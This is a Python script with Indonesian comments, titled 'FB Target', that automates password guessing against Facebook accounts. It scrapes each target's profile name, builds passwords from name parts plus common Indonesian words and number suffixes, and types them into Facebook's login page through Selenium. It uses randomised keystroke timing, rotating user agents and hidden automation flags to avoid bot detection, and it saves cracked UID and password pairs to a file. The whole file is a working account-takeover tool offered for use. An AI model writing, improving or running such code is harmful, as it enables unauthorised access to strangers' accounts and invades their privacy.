import os
import time
import shutil
import re
import random
import pyfiglet
import subprocess  # <<<--- TAMBAHAN BARU
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException

init(autoreset=True)

TARGET_FILE_PATH = "targets.txt"
SUCCESS_FILE_PATH = "akun_berhasil.txt"
FACEBOOK_LOGIN_URL = "https://web.facebook.com/login/"
CHROME_PROFILE_TEMP_PATH = os.path.join(os.getcwd(), "temp_chrome_profile")
COMMON_PASSWORDS = [
    "bismillah", "bismillah123", "iloveyou", "alhamdulillah123", "alhamdulillah", "sayangkamu"
]
KEYWORDS = [
    "123", "12345", "321", "sayang", "ganteng", "cantik",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
]
def hapus_profil_chrome(path):
    if os.path.exists(path):
        try:
            shutil.rmtree(path)
            print(Fore.YELLOW + f"[INFO] Profil sementara di '{path}' berhasil dihapus.") # BISA DIBUAT SILENT
        except Exception as e:
            print(Fore.RED + f"[ERROR] Gagal menghapus profil di '{path}': {e}")

def inisialisasi_browser(profile_path):
    print(Fore.CYAN + "[INFO] Menginisialisasi browser...")
    options = Options()
    options.add_argument(f"--user-agent={random.choice(USER_AGENTS)}")
    options.add_argument(f"--user-data-dir={profile_path}")
    options.add_argument("--disable-notifications")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument('--log-level=3')
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    
    # --- PENGATURAN HEADLESS ---
    #options.add_argument("--headless") #TAMBAHKAN PAGAR DI DEPANNYA UNTUK KELUAR MODE HEADLESS
    #options.add_argument("--disable-gpu") #TAMBAHKAN PAGAR DI DEPANNYA UNTUK KELUAR MODE HEADLESS
    
    try:
        service = Service(
            ChromeDriverManager().install(),
            log_output=os.devnull,
            service_args=['--log-path=' + os.devnull],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        driver = webdriver.Chrome(service=service, options=options)
        print(Fore.GREEN + "[INFO] Browser berhasil dibuat (Mode Headless Silent).") #BISA DIBUAT SILENT CUKUP TAMBAHKAN PAGAR DI DEPANNYA
        return driver
    except Exception as e:
        print(Fore.RED + f"[ERROR] Gagal menginisialisasi browser: {e}")
        return None
def get_profile_name(driver, profile_url):
    print(Fore.CYAN + f"[INFO] Mengambil nama dari: {profile_url}")
    try:
        driver.get(profile_url)
        time.sleep(random.uniform(2, 4))
        wait = WebDriverWait(driver, 15)
        name_element = wait.until(EC.visibility_of_element_located((By.XPATH, "//div[@role='main']//h1")))
        raw_name_text = name_element.text
        if raw_name_text:
            cleaned_name = re.sub(r'[^a-zA-Z\s]', '', raw_name_text).strip()
            if not cleaned_name:
                print(Fore.YELLOW + "[WARN] Nama profil menjadi kosong setelah dibersihkan, target dilewati.")
                return None
            print(Fore.GREEN + f"[INFO] Nama profil ditemukan: {cleaned_name}")
            return cleaned_name
        return None
    except (TimeoutException, NoSuchElementException):
        print(Fore.RED + "[ERROR] Tidak dapat menemukan nama profil.")
        return None
def generate_passwords(first_name, last_name):
    passwords_generated = set()
    fn_lower = first_name.lower().split()[0]
    ln_lower = last_name.lower().split()[-1]
    name_variations = {fn_lower}
    if fn_lower != ln_lower:
        name_variations.add(ln_lower)
    for name in name_variations:
        if not name: continue
        for keyword in KEYWORDS:
            passwords_generated.add(name + keyword)
    passwords_generated.add(fn_lower)
    if fn_lower != ln_lower:
        passwords_generated.add(ln_lower)
        passwords_generated.add(fn_lower + ln_lower)
    for common_pw in COMMON_PASSWORDS:
        passwords_generated.add(common_pw)
    final_list = list(passwords_generated)
    print(Fore.BLUE + f"[INFO] Dibuat total {len(final_list)} kombinasi password.")
    return final_list
def attempt_login_for_target(driver, uid, passwords):
    print(Fore.CYAN + f"[INFO] Memulai percobaan login untuk UID: {uid}...")
    driver.get(FACEBOOK_LOGIN_URL)
    time.sleep(1)
    for i, password in enumerate(passwords, 1):
        try:
            if i % 5 == 0 or i == 1 or i == len(passwords):
                 print(Fore.WHITE + f"  -> Mencoba password #{i} dari {len(passwords)}...", end="\r")
            wait = WebDriverWait(driver, 10)
            email_field = wait.until(EC.visibility_of_element_located((By.ID, "email")))
            pass_field = wait.until(EC.visibility_of_element_located((By.ID, "pass")))
            email_field.clear()
            for char in uid:
                email_field.send_keys(char)
                time.sleep(random.uniform(0.01, 0.05))
            pass_field.clear()
            for char in password:
                pass_field.send_keys(char)
                time.sleep(random.uniform(0.05, 0.15))
            login_button = wait.until(EC.element_to_be_clickable((By.NAME, "login")))
            login_button.click()
            time.sleep(4)
            current_url = driver.current_url.lower()
            if "checkpoint" in current_url or "captcha" in current_url:
                print(Fore.RED + "\n[STATUS] Checkpoint/Captcha terdeteksi. Menghentikan target ini.")
                return "DETECTED", None
            if "login" not in current_url and "facebook.com" in current_url:
                print(Fore.GREEN + Style.BRIGHT + "\n[STATUS] BERHASIL!                                  ")
                return "SUCCESS", password
            page_source = driver.page_source.lower()
            if "kata sandi yang anda masukkan salah" in page_source or "password that you've entered is incorrect" in page_source:
                continue
        except (StaleElementReferenceException, TimeoutException):
            continue
    print(Fore.YELLOW + "\n[STATUS] GAGAL. Semua kombinasi password telah dicoba.")
    return "FAIL", None
def main():
    banner = pyfiglet.figlet_format("FB Target", font="slant")
    print(Fore.MAGENTA + banner)
    print(Fore.MAGENTA + "Silent Version | by Partner Coding".center(60))
    print(Fore.MAGENTA + "="*60)
    if not os.path.exists(TARGET_FILE_PATH):
        print(Fore.RED + f"[ERROR] File '{TARGET_FILE_PATH}' tidak ditemukan!")
        return
    with open(TARGET_FILE_PATH, 'r', encoding='utf-8') as f:
        targets = [line.strip() for line in f if line.strip()]
    if not targets:
        print(Fore.RED + f"[ERROR] File '{TARGET_FILE_PATH}' kosong.")
        return
    for i, target_line in enumerate(targets, 1):
        print(Fore.WHITE + Style.BRIGHT + f"\n--- Memproses Target #{i} dari {len(targets)}: {target_line} ---")
        driver = None
        try:
            hapus_profil_chrome(CHROME_PROFILE_TEMP_PATH)
            driver = inisialisasi_browser(CHROME_PROFILE_TEMP_PATH)
            if not driver:
                print(Fore.RED + "[ERROR] Browser gagal dibuat, lanjut ke target berikutnya.")
                continue
            try:
                profile_link, uid = target_line.split('|')
            except ValueError:
                print(Fore.YELLOW + f"[WARN] Format baris salah, dilewati: '{target_line}' (Harus: link|uid)")
                continue
            name = get_profile_name(driver, profile_link.strip())
            if not name:
                print(Fore.YELLOW + "[WARN] Tidak bisa mendapatkan nama, target ini dilewati.")
                continue
            name_parts = name.strip().split()
            first_name = name_parts[0]
            last_name = name_parts[-1] if len(name_parts) > 1 else first_name
            passwords_to_try = generate_passwords(first_name, last_name)
            status, found_password = attempt_login_for_target(driver, uid.strip(), passwords_to_try)
            if status == "SUCCESS":
                print(Fore.GREEN + Style.BRIGHT + f"[DITEMUKAN] UID: {uid} | Password: {found_password}")
                with open(SUCCESS_FILE_PATH, 'a', encoding='utf-8') as f:
                    f.write(f"{uid}|{found_password}\n")
                print(Fore.GREEN + f"[INFO] Akun berhasil disimpan ke '{SUCCESS_FILE_PATH}'.")
        finally:
            if driver:
                driver.quit()
            hapus_profil_chrome(CHROME_PROFILE_TEMP_PATH)
            print(Fore.MAGENTA + "-" * 60) # bisa di silent cukup tambahkan pagar depannya
            time.sleep(3)

    print(Fore.CYAN + "\n" + "="*60)
    print(Fore.CYAN + "✅ SEMUA TARGET SELESAI DIPROSES".center(60))
    print(Fore.CYAN + "="*60)
if __name__ == "__main__":
    main()